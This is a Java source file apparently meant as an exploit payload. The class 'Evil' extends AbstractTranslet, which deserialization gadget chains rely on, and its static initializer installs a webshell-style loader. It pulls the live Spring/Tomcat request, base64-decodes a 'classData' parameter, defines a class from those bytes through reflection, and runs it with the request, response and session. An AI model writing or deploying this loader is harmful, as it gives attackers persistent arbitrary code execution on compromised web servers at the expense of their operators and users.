package demo;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet {
    static{
        try{
            System.out.println("dan bro");
            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();
            java.lang.reflect.Field r=request.getClass().getDeclaredField("request");
            r.setAccessible(true);
            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();
            javax.servlet.http.HttpSession session = request.getSession();
            System.out.println("dan bro2");
            String classData=request.getParameter("classData");
            System.out.println("dan bro3");
            // 添加null检查
            if (classData != null && !classData.isEmpty()) {
                byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
                java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
                defineClassMethod.setAccessible(true);
                Class cc = (Class) defineClassMethod.invoke(Evil.class.getClassLoader(), classBytes, 0,classBytes.length);
                cc.newInstance().equals(new Object[]{request,response,session});
                System.out.println("dan bro4");
            } else {
                System.out.println("classData is null or empty");
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
    }
    @Override
    public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {
    }
}